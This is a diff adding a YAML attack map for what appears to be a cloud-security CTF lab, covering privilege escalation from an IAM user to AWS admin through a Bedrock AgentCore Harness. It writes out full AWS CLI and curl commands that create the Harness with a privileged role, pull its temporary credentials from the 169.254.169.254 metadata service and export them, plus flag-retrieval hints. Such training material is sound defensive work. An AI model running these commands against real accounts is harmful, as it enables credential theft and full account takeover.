@@ -1,0 +1,161 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-bedrock-005-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could have been
+        obtained through many real-world vectors: phishing a developer and gaining access to
+        their workstation, compromising a browser session, exploiting a vulnerable workload
+        running in this AWS account, discovering credentials in a public S3 bucket, or finding
+        them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user holds iam:PassRole on the target admin role and the full set of
+        bedrock-agentcore permissions needed to create a Harness and invoke a shell command
+        inside its MicroVM: CreateHarness, CreateAgentRuntime, CreateAgentRuntimeEndpoint,
+        CreateWorkloadIdentity, GetAgentRuntime, and InvokeAgentRuntimeCommand. Unlike the
+        bedrock-003 Runtime variant, no custom container image is required -- AWS manages the
+        Harness container. The attacker only needs to specify a Bedrock foundation model ID
+        at creation time. It also has helpful reconnaissance permissions: iam:ListRoles and
+        iam:GetRole.
+
+    - id: agentcore-harness
+      label: "AgentCore Harness"
+      type: resource
+      subType: bedrock-agent
+      arn: "arn:aws:bedrock-agentcore:{region}:{account_id}:harness/bedrock-005-privesc-harness"
+      description: >
+        The AgentCore Harness provisioned by the attacker with the privileged target role as
+        its execution role. A Harness is an AWS-managed agent layer built on top of an
+        AgentCore Runtime: it wires together a foundation model, tools, memory, and
+        observability, and provisions the underlying Runtime automatically. The attacker does
+        not supply a container image -- AWS manages the Harness container entirely. The
+        underlying Runtime runs inside a Firecracker MicroVM, and AWS assumes the execution
+        role on behalf of that Runtime, vending the resulting temporary credentials via the
+        MicroVM Metadata Service (MMDS) at 169.254.169.254. InvokeAgentRuntimeCommand executes
+        commands as root in the MicroVM and bypasses the managed agent loop, the loaded model,
+        and any guardrails entirely.
+
+    - id: target-role
+      label: "Target Admin Role"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-bedrock-005-to-admin-target-role"
+      description: >
+        This IAM role holds AdministratorAccess and trusts bedrock-agentcore.amazonaws.com
+        as a service principal, allowing it to be passed to an AgentCore Harness as its
+        execution role. Once the Harness is provisioned with this role, AWS assumes it on
+        behalf of the underlying Runtime and vends its temporary credentials via MMDS. The
+        attacker extracts AccessKeyId, SecretAccessKey, and Token from the MMDS response and
+        operates as this role locally -- gaining full administrator access to the AWS account.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/bedrock-005-to-admin"
+      description: >
+        The CTF flag for this scenario, stored as an SSM Parameter Store parameter. Retrieving
+        it requires ssm:GetParameter on this specific parameter. The AdministratorAccess policy
+        attached to the target role grants this implicitly -- once you are operating as the
+        target role with the extracted MMDS credentials, you can read this parameter to prove
+        end-to-end exploitation of the bedrock-005 privilege escalation path.
+
+  edges:
+    - from: starting-principal
+      to: agentcore-harness
+      label: "iam:PassRole + bedrock-agentcore:CreateHarness"
+      description: >
+        Using the starting user credentials, the attacker calls CreateHarness, passing the
+        target admin role as the executionRoleArn and specifying a Bedrock foundation model
+        ID. No custom container image is required -- AWS manages the Harness container.
+        The iam:PassRole permission authorizes handing the privileged role to the new Harness.
+        CreateHarness internally calls CreateAgentRuntime, CreateAgentRuntimeEndpoint, and
+        CreateWorkloadIdentity to fully provision the underlying Runtime; all three permissions
+        must be present in the attacker's policy set for the API call to succeed. The response
+        includes the underlying agentRuntimeId. The attacker then polls GetAgentRuntime with
+        that runtime ID until the status reaches READY -- typically 1-3 minutes.
+      commands:
+        - description: "Get account ID and build the target role ARN"
+          command: |
+            ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+            TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-bedrock-005-to-admin-target-role"
+        - description: "Create the AgentCore Harness with the privileged execution role and a foundation model"
+          command: |
+            HARNESS_RESPONSE=$(aws bedrock-agentcore-control create-harness \
+              --region us-east-1 \
+              --name bedrock-005-privesc-harness \
+              --execution-role-arn "$TARGET_ROLE_ARN" \
+              --model-id "amazon.nova-lite-v1:0")
+            HARNESS_ID=$(echo "$HARNESS_RESPONSE" | jq -r '.harnessId')
+            RUNTIME_ID=$(echo "$HARNESS_RESPONSE" | jq -r '.agentRuntimeId')
+            echo "Harness ID: $HARNESS_ID"
+            echo "Runtime ID: $RUNTIME_ID"
+        - description: "Poll until the underlying Runtime reaches READY state"
+          command: |
+            while true; do
+              STATUS=$(aws bedrock-agentcore-control get-agent-runtime \
+                --region us-east-1 \
+                --agent-runtime-id "$RUNTIME_ID" \
+                --query 'status' --output text)
+              echo "Status: $STATUS"
+              [ "$STATUS" = "READY" ] && break
+              sleep 15
+            done
+      hints:
+        - "CreateHarness is the Harness-specific equivalent of CreateAgentRuntime -- it wires a foundation model and managed agent layer on top of an underlying Runtime. You do not need a container image; specify a model ID instead. The executionRoleArn is the key field that makes this a privilege escalation."
+        - "After CreateHarness returns, extract the agentRuntimeId from the response and poll GetAgentRuntime until status reaches READY before calling InvokeAgentRuntimeCommand. Initialization typically takes 1-3 minutes."
+        - "Browse to https://pathfinding.cloud/paths/bedrock-005 for technique details."
+
+    - from: agentcore-harness
+      to: target-role
+      label: "bedrock-agentcore:InvokeAgentRuntimeCommand"
+      description: >
+        With the underlying Runtime in READY state, the attacker calls InvokeAgentRuntimeCommand
+        using the Runtime ID (not the Harness ID) with a bash command that reads temporary
+        credentials from MMDS. The command requests an IMDSv2 token, then uses it to fetch
+        the execution role name from the MMDS security-credentials path, and finally retrieves
+        the full credential JSON (AccessKeyId, SecretAccessKey, Token) for the target admin
+        role. InvokeAgentRuntimeCommand runs as root inside the MicroVM and bypasses the
+        managed agent loop, the loaded model, and any guardrails entirely. The model is never
+        actually invoked by this attack.
+      commands:
+        - description: "Invoke a shell command to read MMDS credentials from the Harness MicroVM"
+          command: |
+            CREDS=$(aws bedrock-agentcore invoke-agent-runtime-command \
+              --region us-east-1 \
+              --agent-runtime-id "$RUNTIME_ID" \
+              --command 'TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"); ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE' \
+              --query 'output' \
+              --output text)
+            echo "$CREDS"
+        - description: "Export the extracted credentials"
+          command: |
+            export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
+            export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
+            export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
+        - description: "Verify admin access via the extracted credentials"
+          command: "aws sts get-caller-identity"
+      hints: []
+
+    - from: target-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        Using the temporary credentials extracted from MMDS, the attacker now operates as the
+        target admin role. AdministratorAccess grants ssm:GetParameter on all parameters in
+        the account, including the flag parameter. Read the flag to prove end-to-end
+        exploitation of the bedrock-005 privilege escalation path.
+      commands:
+        - description: "Retrieve the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/bedrock-005-to-admin --query 'Parameter.Value' --output text"
+      hints:
+        - "You now hold administrator credentials extracted from the Harness MicroVM. The CTF flag lives in SSM Parameter Store under the /pathfinding-labs/flags/ prefix."
+        - "Use ssm:GetParameter with the scenario-specific parameter name to retrieve the flag."
